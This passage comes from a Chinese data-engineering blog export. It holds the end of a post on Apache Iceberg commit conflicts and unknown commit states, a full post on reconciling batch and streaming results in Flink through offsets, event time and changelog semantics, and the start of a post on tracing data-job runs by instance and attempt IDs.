<p>A 先把 catalog pointer 从 v10 切到 v11-A。B 提交时，catalog 当前值已经不是自己的 base v10，commit 必须失败。<code>BaseMetastoreTableOperations.commit()</code> 在进到具体 catalog 提交前，就会拒绝本地已经陈旧的 base；Hive 实现拿到 HMS lock 后，还会再次比较 base metadata location 与表当前 <code>metadata_location</code>，不同就抛 <code>CommitFailedException</code>。</p>
<p>这是 compare-and-swap 的核心：只有“当前仍等于我读到的 base”时，才能把它替换成我的新版本。HMS lock 用来串行化临界区，但正确性仍要靠 base location 比较，不能把“拿到锁”误解成自己的计算结果一定仍然有效。</p>
<p>对于普通 append，B 刷新到 v11-A 后，通常可以把自己已经写好的 manifest 加到新 metadata tree 上再提交。Iceberg 的 manifest 设计允许在重试中复用大部分已写内容，所以冲突不必重新跑整份数据计算。</p>
<p>表面上看，最终历史是 v10 -&gt; v11-A -&gt; v12-B，两个 append 都保留。顺序由成功提交决定，不由任务启动时间决定。</p>
<h2 id="重试之前必须重新验证假设"><a href="#重试之前必须重新验证假设" class="headerlink" title="重试之前必须重新验证假设"></a>重试之前必须重新验证假设</h2><p>Iceberg 的可靠性文档把 commit 拆成 assumptions 和 actions。冲突发生后，writer 先在新的当前状态上检查假设是否仍成立，再重新应用动作。</p>
<p>Append 的假设通常比较宽：我只增加一批新文件，另一个 writer 同时增加其他文件，二者可以合并。Rewrite&#x2F;compaction 就不同。假设任务把 <code>file_a</code>、<code>file_b</code> 重写为 <code>merged.parquet</code>，它提交时必须确认 <code>file_a</code> 与 <code>file_b</code> 仍在当前表中。如果并发任务已经删除或替换其中一个文件，继续提交会把别人的结果覆盖掉，正确动作是失败而不是硬重试。</p>
<p>Overwrite 还需要考虑读写集合。一个动态分区覆盖任务与迟到数据 append 同时发生，是否可以重试，取决于它验证的是目标分区、匹配过滤条件的数据文件，还是某个明确 snapshot 之后没有冲突数据。把所有 <code>CommitFailedException</code> 都捕获后 <code>while(true)</code>，只是绕开了 API 想保护的隔离语义。</p>
<p><code>SnapshotProducer.commit()</code> 只对 <code>CommitFailedException</code> 按配置做指数退避重试。每次 <code>apply()</code> 都会 refresh base 并重新运行子操作的 validation。这个顺序很重要：不是拿同一个 metadata 文件反复写 catalog，而是在新 base 上重新构造待提交 snapshot。</p>
<p>我会按操作类型分别统计 commit conflict。Append 的偶发冲突可以重试；同一分区上的高频 overwrite、delete、compaction 冲突，说明调度和维护策略互相踩踏，需要从任务编排上错开。</p>
<h2 id="提交失败和提交状态未知不是一回事"><a href="#提交失败和提交状态未知不是一回事" class="headerlink" title="提交失败和提交状态未知不是一回事"></a>提交失败和提交状态未知不是一回事</h2><p>Catalog 返回确定的 compare-and-swap 失败时，writer 知道新 metadata 没有成为表状态，可以清理这次未提交的 metadata 文件，并按规则重试。</p>
<p>更难处理的是网络超时：请求可能已经在 HMS 或其他 catalog 中成功，客户端只是在响应返回前断开。此时再盲目提交一次，可能重复 append；立即删除新 metadata 或 data file，又可能破坏一笔已经成功的提交。</p>
<p>Iceberg 0.12.0 为此保留 <code>CommitStatus.UNKNOWN</code>。<code>BaseMetastoreTableOperations.checkCommitStatus()</code> 会 refresh 表，检查本次 new metadata location 是否是当前 metadata，或是否出现在 previous metadata history 中。之所以还要查 history，是因为本次提交成功后，另一个 writer 可能已经在它上面又提交了一版。</p>
<p>如果多次检查仍无法判断，应该抛出 <code>CommitStateUnknownException</code>，把任务停在“需要确认”的状态，而不是自动宣布失败。运维页面也应该把 FAILED 与 UNKNOWN 分开：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>可以采取的动作</th>
</tr>
</thead>
<tbody><tr>
<td>明确 commit failed</td>
<td>刷新 base，重新验证，按操作语义重试</td>
</tr>
<tr>
<td>明确 commit succeeded</td>
<td>记录 snapshot ID，进入下游验证</td>
</tr>
<tr>
<td>commit state unknown</td>
<td>查询 metadata history；未确认前不重复写、不删文件</td>
</tr>
</tbody></table>
<p>这类状态是分布式提交的正常边界，不是一个可以用“重试三次”隐藏掉的异常文案。</p>
<h2 id="失败会留下文件，清理不能追着任务跑"><a href="#失败会留下文件，清理不能追着任务跑" class="headerlink" title="失败会留下文件，清理不能追着任务跑"></a>失败会留下文件，清理不能追着任务跑</h2><p>新 snapshot 可见之前，writer 已经产生 data file、manifest list 和 metadata file。冲突重试可以复用一部分文件，也会生成新的 manifest list；确定失败后，Iceberg 会尝试清理未使用的 metadata，但清理本身也可能失败。</p>
<p>因此表目录出现 orphan file 并不意外。危险的是写一个定时脚本，把“最近没有被当前 snapshot 引用”的文件全部删除。历史 snapshot 可能还在引用，长时间运行的 reader 也可能仍基于旧 snapshot 读取。文件是否可删要结合 snapshot expiration 和可达性判断，并给正在运行的任务留出安全时间窗。</p>
<p>相反，snapshot expiration 也不等于马上删除所有数据。规范说明，文件可以在最后一个把它作为 live data 的 snapshot 被回收后删除；实际检测和删除还要考虑失败重试与存储一致性。维护任务需要单独的审计记录：过期了哪些 snapshot、计划删哪些文件、实际删成功多少、失败列表在哪里。</p>
<p>我会把 commit 与 maintenance 分成两条链路。在线 writer 负责正确生成并提交 snapshot，不在提交热路径上做大范围目录扫描；维护任务负责 expire snapshots、remove orphan files 和 manifest rewrite，并避开正在进行的 overwrite&#x2F;compaction。</p>
<h2 id="运维上要盯的是提交链路，不只是数据量"><a href="#运维上要盯的是提交链路，不只是数据量" class="headerlink" title="运维上要盯的是提交链路，不只是数据量"></a>运维上要盯的是提交链路，不只是数据量</h2><p>一张 Iceberg 表写得慢，可能慢在生成 data file，也可能卡在 catalog lock、metadata refresh、manifest merge 或 commit 重试。只看 Spark&#x2F;Flink task 是否结束，不能判断表状态是否已经切换。</p>
<p>我会为每次写入保存这些证据：base snapshot ID、attempt 次数、每次失败原因、新 snapshot ID、metadata location、added&#x2F;deleted file count、catalog commit 耗时，以及最终 commit status。状态未知时，再保存检查到的 current&#x2F;previous metadata locations。</p>
<p>并发治理也要按表和分区做。某张表一天出现一两次 append conflict，重试很快成功，通常可以接受；每轮 compaction 都与实时 append 冲突，说明维护窗口或隔离条件设计有问题。继续放大重试次数会增加 metadata 文件与 catalog 压力，不能解决操作假设本身互斥。</p>
<p>Iceberg 原子提交真正提供的是一条清晰的可见性边界：pointer 切换前，读者看旧 snapshot；切换后，读者可以看到完整的新 snapshot。围绕这条边界，平台还要正确处理冲突、未知状态、孤儿文件和历史清理。少了这些，原子性只是一句听起来很安全的宣传语。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/reliability.md#L18-L33">Iceberg 0.12.0 Reliability：metadata pointer 原子切换与 snapshot 可靠性</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/reliability.md#L42-L60">Iceberg 0.12.0 Reliability：乐观并发、重试与冲突验证</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/spec.md#L43-L63">Iceberg 0.12.0 Spec：metadata file、snapshot、manifest 的关系</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/core/src/main/java/org/apache/iceberg/BaseMetastoreTableOperations.java#L113-L130"><code>BaseMetastoreTableOperations.commit()</code>：拒绝 stale table metadata</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/core/src/main/java/org/apache/iceberg/SnapshotProducer.java#L269-L307"><code>SnapshotProducer.commit()</code>：仅对 CommitFailedException 重新 apply 与提交</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/hive-metastore/src/main/java/org/apache/iceberg/hive/HiveTableOperations.java#L203-L243"><code>HiveTableOperations.doCommit()</code>：HMS lock 下比较 base metadata location</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/core/src/main/java/org/apache/iceberg/BaseMetastoreTableOperations.java#L266-L312"><code>checkCommitStatus()</code>：从 current 与 previous metadata 判断未知提交结果</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>并发提交</tag>
        <tag>数据湖</tag>
      </tags>
  </entry>
  <entry>
    <title>批处理和流处理为什么算不出同一个数：先统一数据边界与 Changelog 语义</title>
    <url>//2021/09/19/batch-stream-consistency/</url>
    <content><![CDATA[<p>同一段 SQL，离线任务算出的订单金额是 1000 万，实时看板是 998 万。很多团队会先对 SQL 文本，确认 join、filter、group by 看起来一致，然后把差异归因成“实时有延迟”。</p>
<p>SQL 一致只是最表面的一层。批处理读的是一个有界快照，流处理消费的是持续变化的 changelog；两边如果没有停在同一个数据边界上，就连应该相等的时刻都没有定义。再叠加事件时间、watermark、迟到数据、UPDATE&#x2F;DELETE 和 sink 主键，数值不同反而是正常结果。</p>
<p>Flink 1.13.1 的动态表文档有一句很重要的话：连续查询在任意时刻的结果，语义上等价于在输入表快照上执行同一批查询。这个“输入表快照”就是批流对账需要构造的参照物，而不是墙上时间写着几点。</p>
<p class="article-diagram-scroll"><img src="/images/articles/batch-stream-consistency.svg" class="lazyload" data-srcset="/images/articles/batch-stream-consistency.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="批流对账必须统一的四层边界"></p>
<span id="more"></span>

<h2 id="先定义两边停在哪一批数据"><a href="#先定义两边停在哪一批数据" class="headerlink" title="先定义两边停在哪一批数据"></a>先定义两边停在哪一批数据</h2><p>假设 10:00 发起离线查询，同时去实时库读一个结果。离线任务扫描需要 20 分钟，源表在这段时间仍有新数据；实时任务也在不断消费。即使两份 SQL 完全相同，双方读取的输入集合也不相同。</p>
<p>可靠的边界应该能枚举、能保存、能重放。Kafka source 最直接的边界是每个 partition 的 offset 集合：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">topic=orders</span><br><span class="line">partition-0: [start=0, end=148230)</span><br><span class="line">partition-1: [start=0, end=153991)</span><br><span class="line">partition-2: [start=0, end=146008)</span><br></pre></td></tr></table></figure>

<p>对账用的流结果要明确已经处理并提交到这一组 end offset。离线回放也只读取相同的 offset 区间。这样“同一批输入”才有可验证含义。</p>
<p>用 <code>2021-09-19 10:00:00</code> 作为边界弱一些。Kafka 支持按 timestamp 找每个 partition 的起始位置，但 timestamp 最终仍会映射为各 partition 的 offset，而且 CreateTime、LogAppendTime 与业务事件时间不是同一个概念。时钟偏差、生产端重试和跨 partition 顺序都可能让同一个时间值对应不同输入。</p>
<p>如果批数据来自 Hive 分区、流数据来自 Kafka，还需要在采集层建立映射：某个离线快照包含到哪些 source offset 或 Binlog position。没有这份映射，离线分区 <code>dt=2021-09-19</code> 和实时“截至 9 月 19 日”的口径只是名字相似。</p>
<h2 id="Processing-Time-无法作为可复算口径"><a href="#Processing-Time-无法作为可复算口径" class="headerlink" title="Processing Time 无法作为可复算口径"></a>Processing Time 无法作为可复算口径</h2><p>Flink 把处理时间定义为机器执行操作时的本地时间。它使用方便，不需要从记录提取时间，也不需要 watermark，但官方文档明确指出它不能提供确定性。</p>
<p>同一批事件今天回放一次，机器速度、并行度和调度时机都可能不同，记录落入的 processing-time window 会变化。离线 SQL 往往按业务字段 <code>pay_time</code> 分组，实时 SQL 却按 <code>PROCTIME()</code> 开窗，两份结果天然没有逐窗口相等的保证。</p>
<p>需要批流复算时，我会使用事件时间。事件时间来自数据本身，Flink 文档说明它在乱序和迟到场景下可以产生一致、可重放的结果；流式作业中的 event-time attribute，在批作业中就是普通时间字段。这给两种执行模式提供了共同坐标。</p>
<p>但把字段都改名为 <code>event_time</code> 仍然不够，还要统一：</p>
<ul>
<li>时间字段取业务发生、数据库提交还是进入消息队列的时间；</li>
<li>字段使用 UTC、Asia&#x2F;Shanghai 还是无时区 timestamp；</li>
<li>窗口是左闭右开还是其他边界；</li>
<li>watermark 允许多大乱序；</li>
<li>watermark 之后到达的数据是丢弃、侧输出还是触发修正；</li>
<li>补数是否沿用原 event time。</li>
</ul>
<p>其中任何一个不同，日窗口边界和最终数据集合都会变化。对账文档里只写“按天统计”，没有办法复现。</p>
<h2 id="流-SQL-输出的是变化，不一定是一行最终值"><a href="#流-SQL-输出的是变化，不一定是一行最终值" class="headerlink" title="流 SQL 输出的是变化，不一定是一行最终值"></a>流 SQL 输出的是变化，不一定是一行最终值</h2><p>批查询结束时返回一张静态结果表。流式 <code>GROUP BY</code> 是连续查询，输入每来一条记录，结果表可能 INSERT，也可能 UPDATE 以前的聚合值。</p>
<p>Flink 动态表把这种变化编码成 append、retract 或 upsert changelog。非窗口的用户计数会持续更新；如果 sink 只支持 append，把每次中间结果都当成一条最终记录，目标表里就会同时出现 count&#x3D;1、2、3。离线表每个用户只有一行，双方当然对不上。</p>
<p>Upsert sink 需要稳定的唯一键。Flink 1.13.1 的 upsert-kafka 根据主键把 INSERT&#x2F;UPDATE_AFTER 写成普通消息，把 DELETE 写成 null value，并保证相同主键的更新进入同一 partition。消费端按 key 物化后，才得到动态表的当前状态。</p>
<p>这也解释了为什么“消息条数”不能直接和“离线结果行数”对账。一行聚合结果可以在 Kafka 中产生多次更新消息，但物化后仍是一行。应该比较相同边界上的 materialized state，或者按 changelog 语义重放后再比，而不是比较传输次数。</p>
<p>Flink 文档还说明，Upsert Kafka 在启用 checkpoint 时默认是至少一次，故障可能写出相同 key 的重复记录。因为消费端只让同一 key 的最后值生效，状态可以保持幂等。若目标端是普通 append 表，这个保证不会自动成立。</p>
<h2 id="UPDATE、DELETE-和-CDC-顺序要进入口径"><a href="#UPDATE、DELETE-和-CDC-顺序要进入口径" class="headerlink" title="UPDATE、DELETE 和 CDC 顺序要进入口径"></a>UPDATE、DELETE 和 CDC 顺序要进入口径</h2><p>批处理扫描数据库当前表，看到的是 UPDATE 与 DELETE 应用后的状态。流作业若消费 CDC，却只保留 <code>after</code> 字段并忽略 operation，可能把 UPDATE 当新增、把 DELETE 完全漏掉。</p>
<p>以订单状态统计为例，一笔订单从 CREATED 更新到 PAID：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">批表当前状态：order_id=42, status=PAID</span><br><span class="line">CDC changelog：INSERT CREATED, UPDATE_BEFORE CREATED, UPDATE_AFTER PAID</span><br></pre></td></tr></table></figure>

<p>实时聚合如果只把两条 after 记录做 count，会让 CREATED 和 PAID 各加一次；正确的动态表语义应撤回旧状态，再增加新状态。删除同理，需要从旧分组扣减。</p>
<p>主键变化更复杂。上游把业务主键从 A 改到 B，很多 CDC 格式会表现为旧 key 的 DELETE 与新 key 的 INSERT。下游若重新按另一个字段分区，必须保持每个结果 key 的更新顺序，否则旧值可能在新值之后到达，覆盖正确状态。</p>
<p>我对批流 SQL 的检查不会止于 SELECT 文本，还会比较 source 声明的 changelog mode、planner 推导出的主键、sink 接受的 RowKind，以及故障恢复后的重复处理方式。这些才决定 SQL 结果怎样落成一张可查询的表。</p>
<h2 id="Watermark-是完成判断，不是数据删除证明"><a href="#Watermark-是完成判断，不是数据删除证明" class="headerlink" title="Watermark 是完成判断，不是数据删除证明"></a>Watermark 是完成判断，不是数据删除证明</h2><p>事件时间作业不能永远等“也许还会来”的旧事件。Watermark 表示系统认为某个事件时间之前的数据大体已经到齐，窗口据此触发结果和清理状态。</p>
<p>Watermark 策略不同，会让实时结果的完成时刻和迟到处理不同。设置 5 秒乱序，不代表所有业务数据都能在 5 秒内到达；Kafka 积压、上游重试或移动端离线都可能让事件晚几个小时。离线任务第二天扫描全量分区时把这些记录算进去，实时窗口若已经关闭且不再修正，双方会形成稳定差异。</p>
<p>这个差异不能靠每天人工重跑解决。需要选择一个明确策略：</p>
<ol>
<li>实时层接受暂态结果，离线完成后以校准表覆盖；</li>
<li>实时 sink 支持对已关闭窗口发修正 changelog；</li>
<li>迟到记录进入单独数据集，按 SLA 触发可审计补偿；</li>
<li>业务口径明确超过某个迟到阈值不再计入。</li>
</ol>
<p>选哪一种取决于业务，但必须进入指标定义。对外只展示一个数字，又不标注“实时估算”或“已离线校准”，用户会把技术层的完成度差异理解成数据错误。</p>
<h2 id="我会用固定边界做一轮可重放对账"><a href="#我会用固定边界做一轮可重放对账" class="headerlink" title="我会用固定边界做一轮可重放对账"></a>我会用固定边界做一轮可重放对账</h2><p>一轮有效的批流对账，不是在大盘上找两个看起来接近的数字。我会保存一份运行清单：topic 与每分区 end offset、源表 snapshot&#x2F;Binlog position、event time 字段和时区、watermark 策略、SQL 版本、UDF 版本、维表版本、sink 主键和 changelog mode。</p>
<p>然后让流任务处理到指定 offset 并完成 checkpoint，导出此时的物化结果；离线任务用同一输入边界和维表版本计算。比较时从总量逐步下钻到日期、分区、业务 key，并把差异 key 回放成事件序列。</p>
<p>如果同一组输入与版本能稳定复现差异，才去找算子语义或实现问题；如果每次输入边界都不同，就先修对账工具。一个不可重放的“差 2 万”只是一条告警，不是诊断证据。</p>
<p>批流一致性不是要求两个系统每秒钟都显示完全相同的数，而是当它们指向同一输入快照、同一时间语义和同一物化规则时，能够得到相同结果；有差异时，还能沿 offset 和 changelog 找到哪条记录改变了结果。</p>
<h2 id="对照文档"><a href="#对照文档" class="headerlink" title="对照文档"></a>对照文档</h2><ul>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/dev/table/concepts/dynamic_tables.md#L69-L84">Flink 1.13.1 动态表：连续查询与输入快照上的批查询语义等价</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/dev/table/concepts/dynamic_tables.md#L161-L179">Flink 1.13.1 动态表：append、retract 与 upsert changelog</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/dev/table/concepts/time_attributes.md#L86-L104">Flink 1.13.1 时间属性：processing time 不确定，event time 可重放</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/dev/table/concepts/time_attributes.md#L221-L247">Flink 1.13.1 时间属性：事件时间、乱序与 watermark</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/connectors/table/kafka.md#L472-L488">Flink 1.13.1 Kafka connector：五种起始 offset 模式</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/connectors/table/upsert-kafka.md#L29-L36">Flink 1.13.1 Upsert Kafka：主键顺序与 DELETE 编码</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/connectors/table/upsert-kafka.md#L241-L249">Flink 1.13.1 Upsert Kafka：至少一次与物化幂等边界</a></li>
</ul>
]]></content>
      <categories>
        <category>数据架构</category>
      </categories>
      <tags>
        <tag>批流一致性</tag>
        <tag>Flink SQL</tag>
        <tag>数据口径</tag>
      </tags>
  </entry>
  <entry>
    <title>数据任务失败为什么总要翻五个系统：先把 instance_id 传到执行端</title>
    <url>//2021/10/13/data-job-observability-evidence/</url>
    <content><![CDATA[<p>数据任务失败后，排查过程经常是这样的：先在调度平台找到实例，再去 YARN 搜 application，进入引擎页面找 stage，最后 SSH 到某个节点翻 container 日志。中间任何一层 ID 没记住，就只能靠任务名和时间范围碰运气。</p>
<p>这不是日志数量不够，而是缺少关联键。调度器、提交服务、资源管理器和计算引擎各自都有状态，却没有一条稳定标识把它们连成同一次运行。平台最后只能截取“最近 100 行”放在失败弹窗里，看起来集中，实际上丢掉了大量上下文。</p>
<p>我做数据任务可观测性时，第一步不会先搭新的日志检索页面，而是把 <code>schedule_instance_id</code> 从创建实例开始传到执行端，并在每次外部资源分配后立即保存映射。只要关联关系可靠，日志、指标、trace 和配置才有机会组成证据链。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-job-observability-evidence.svg" class="lazyload" data-srcset="/images/articles/data-job-observability-evidence.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据任务从调度实例到运行证据的关联链"></p>
<span id="more"></span>

<h2 id="任务名不是一次运行的身份"><a href="#任务名不是一次运行的身份" class="headerlink" title="任务名不是一次运行的身份"></a>任务名不是一次运行的身份</h2><p>任务名会修改，也可能在不同项目中重复。计划时间也不够稳定：补数、手动运行和重试都可能拥有相同的业务日期，一次提交延迟几分钟后，靠时间窗口搜索很容易匹配到另一轮运行。</p>
<p>我会区分至少四类 ID：</p>
<table>
<thead>
<tr>
<th>标识</th>
<th>表达的对象</th>
</tr>
</thead>
<tbody><tr>
<td><code>job_id</code></td>
<td>可编辑的任务定义</td>
</tr>
<tr>
<td><code>schedule_instance_id</code></td>
<td>某个调度周期产生的一次逻辑运行</td>
</tr>
<tr>
<td><code>attempt_id</code></td>
<td>同一实例的第几次执行尝试</td>
</tr>
<tr>
<td><code>engine_execution_id</code></td>
<td>外部引擎分配的 application、job 或 query ID</td>
</tr>
</tbody></table>
<p>实例重试时，<code>schedule_instance_id</code> 不变，平台 <code>attempt_id</code> 递增；每个 attempt 可能拿到新的 YARN ApplicationId 或 Flink JobId。这样用户说“这次实例失败两次、第三次成功”，数据库里能准确表示，而不是把旧状态覆盖掉。</p>
<p>YARN 自身也有类似层次。<code>ApplicationAttemptId</code> 属于一个 <code>ApplicationId</code>，一个 ApplicationMaster 因节点、网络等临时故障可能产生多个 attempt；<code>ContainerId</code> 又带着分配它的 ApplicationAttemptId。平台如果只保存 application ID，会把不同 AM attempt 的 container 日志混在一起。</p>
<p>关联键需要在提交请求里显式传播，例如作为 YARN application tag、Flink job name 的结构化后缀、环境变量和日志 MDC 字段。只在任务名称里拼一个 ID 能应急，但后续解析脆弱，最好同时保存独立属性。</p>
<h2 id="外部执行-ID-必须在拿到时立即落库"><a href="#外部执行-ID-必须在拿到时立即落库" class="headerlink" title="外部执行 ID 必须在拿到时立即落库"></a>外部执行 ID 必须在拿到时立即落库</h2><p>提交服务调用引擎后，通常先拿到 application ID，真正的任务还在异步运行。如果进程在“提交成功”和“更新实例表”之间崩溃，集群上会留下一个无人认领的 application，调度平台却认为提交失败，再次重试后又启动一份。</p>
<p>这个窗口不能靠多写日志解决。提交协议要支持幂等 request ID，平台先为 attempt 分配稳定 ID，再提交；引擎返回 execution ID 后，在进入轮询前持久化映射。恢复进程先按 request&#x2F;attempt 查已有执行，不要直接重新提交。</p>
<p>我倾向于把状态变化保存为事件，而不是只更新一列：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">09:20:01 attempt_created</span><br><span class="line">09:20:03 submit_started        request_id=req-...</span><br><span class="line">09:20:05 engine_accepted       application_id=application_...</span><br><span class="line">09:20:08 state=ACCEPTED</span><br><span class="line">09:21:14 state=RUNNING         app_attempt=1</span><br><span class="line">09:37:42 state=FAILED          diagnostics=...</span><br></pre></td></tr></table></figure>

<p>当前状态可以由事件归并得到，原始转移记录用于解释“为什么页面刚才显示运行中，现在显示提交失败”。轮询返回旧状态、回调乱序时，也能依据来源时间和状态机规则拒绝倒退。</p>
<p>状态事件至少同时保存平台接收时间与引擎事件时间。跨机器时钟可能有偏差，所以因果顺序优先使用 ID、sequence 和状态机，不要只靠时间戳排序。</p>
<h2 id="TraceId-用来关联，领域-ID-用来审计"><a href="#TraceId-用来关联，领域-ID-用来审计" class="headerlink" title="TraceId 用来关联，领域 ID 用来审计"></a>TraceId 用来关联，领域 ID 用来审计</h2><p>OpenTelemetry 的 <code>SpanContext</code> 包含 TraceId 与 SpanId，子 span 继承同一个 TraceId。日志数据模型也预留 TraceId、SpanId、Resource、Attributes 等字段，方便从一条错误日志跳回对应 span。</p>
<p>这些机制很适合串起一次同步调用，例如调度器请求提交服务、提交服务访问元数据库、再调用引擎网关。数据任务却常常运行几小时，经过消息队列、重试和异步回调。把整个生命周期硬塞进一个长 span，采样、超时和存储成本都会变得难处理。</p>
<p>我的做法是让领域 ID 永久保存，trace 做阶段性诊断：</p>
<ul>
<li><code>schedule_instance_id</code>、<code>attempt_id</code>、<code>engine_execution_id</code> 进入每条状态事件和关键日志，不受 trace 采样影响；</li>
<li>提交、轮询、停止、重跑等控制面调用各自形成 span，并把领域 ID 放进 attributes；</li>
<li>异步阶段不能表达成严格 parent-child 时，用 span link 关联原提交；</li>
<li>从日志中的 TraceId 可以进入调用链，从 trace attributes 也能回到完整任务实例。</li>
</ul>
<p>OpenTelemetry Resource 表示产生遥测数据的实体，可以包含 Kubernetes Pod、namespace、deployment 等属性。对于数据任务，我还会附上执行集群、队列、worker 类型、引擎版本。这些属性描述“日志从哪里来”，不要拿它们代替实例 ID；同一个 Pod 可以连续执行很多实例。</p>
<p>Trace 也不应该细到每条数据记录。一个 DataX channel、Flink operator 或 Spark stage 可以作为阶段性观测单元，百万行数据逐行建 span 只会把可观测系统本身压垮。数据层异常用计数器、采样错误和明确的 source position 更合适。</p>
<h2 id="日志、指标、配置要指向同一个-attempt"><a href="#日志、指标、配置要指向同一个-attempt" class="headerlink" title="日志、指标、配置要指向同一个 attempt"></a>日志、指标、配置要指向同一个 attempt</h2><p>一条 <code>OutOfMemoryError</code> 只有错误文本，诊断价值有限。需要知道它属于哪个 attempt、哪个 container、当时申请多少资源、处理到什么输入位置、代码和配置是哪一版。</p>
<p>我会给关键日志统一增加这些字段：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;instance_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attempt_id&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;engine_execution_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application_...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;container_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;container_...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;stage&quot;</span><span class="punctuation">:</span> <span class="string">&quot;writer&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;config_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sha256:...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;code_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git:...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trace_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>同一组低基数字段可以作为指标标签：job type、engine、queue、cluster、result、error category。实例 ID、SQL 文本、完整异常这类高基数内容不要直接做时序指标 label，否则基数会迅速膨胀；它们保存在事件或日志里，通过查询链接下钻。</p>
<p>配置快照要在 attempt 创建时冻结。任务定义在运行过程中被修改，失败实例仍应指向当时的 SQL、JAR、参数、数据源版本和资源配置。密码与 token 不保存明文，只记录 secret reference 与版本。没有配置快照，所谓“用相同参数重跑”往往已经不是同一实验。</p>
<p>指标曲线也要能回到运行实例。CPU、内存、GC、吞吐、反压、读写失败数应带 engine execution 或 container 的映射；平台查询时先由 instance 找资源 ID，再按时间范围取指标。把所有 worker 的平均 CPU 放在任务详情页，只会掩盖单个热点 container。</p>
<h2 id="输入水位与输出提交才是数据证据"><a href="#输入水位与输出提交才是数据证据" class="headerlink" title="输入水位与输出提交才是数据证据"></a>输入水位与输出提交才是数据证据</h2><p>任务显示 SUCCESS，只证明执行框架返回成功，不证明业务数据完整。一次可验证的运行还需要记录输入和输出边界。</p>
<p>批任务可以保存源分区、文件清单版本、表 snapshot ID；流任务保存 Kafka offsets、Binlog position、checkpoint ID；目标是 Hive 分区时保存目标路径和提交标记，是 Iceberg 时保存 committed snapshot ID。这样才能回答“这一轮到底处理了哪批数据，结果提交到哪里”。</p>
<p>行数和脏数据数属于摘要证据，不能替代边界。两次任务都写了 100 万行，可能处理的是不同 offset；重跑写入相同分区，看起来成功，实际覆盖了后来补进的数据。输入水位、配置版本和输出版本放在一起，才具备复现条件。</p>
<p>我会把一次运行的证据归成五组：</p>
<ol>
<li>身份：instance、attempt、engine application&#x2F;container；</li>
<li>输入：分区、offset、snapshot 或 query cutoff；</li>
<li>执行：代码、配置、SQL、资源和状态事件；</li>
<li>观测：日志、trace、指标与错误样本；</li>
<li>输出：目标版本、提交 ID、计数与校验结果。</li>
</ol>
<p>平台详情页的作用，是用同一个 attempt 把五组信息组织起来，不是把五套系统都嵌一个 iframe。</p>
<h2 id="保留原始证据，摘要可以重新生成"><a href="#保留原始证据，摘要可以重新生成" class="headerlink" title="保留原始证据，摘要可以重新生成"></a>保留原始证据，摘要可以重新生成</h2><p>“最后 100 行日志”适合快速预览，不适合做唯一留存。真正错误可能在几分钟前第一次出现，后面的级联异常会把它挤掉；多 container 任务的最后 100 行也不知道来自哪个进程。</p>
<p>原始日志应按 attempt&#x2F;container 保存到可检索存储，UI 展示错误附近上下文并提供原文件定位。错误摘要、根因分类可以后算，原始文本一旦截断就无法恢复。日志保留期至少覆盖常见故障复盘与版本发布周期，删除策略要能解释。</p>
